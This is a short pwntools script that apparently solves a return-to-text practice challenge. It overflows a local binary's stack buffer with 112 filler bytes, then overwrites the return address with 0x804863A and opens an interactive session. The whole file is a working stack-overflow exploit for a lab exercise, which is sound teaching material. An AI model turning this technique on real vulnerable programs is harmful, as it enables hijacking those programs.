from pwn import *

io = process('../ex1-rop/ret2text')
payload = b'a' * 112+ p32(0x804863A)
io.sendline(payload)
io.interactive()
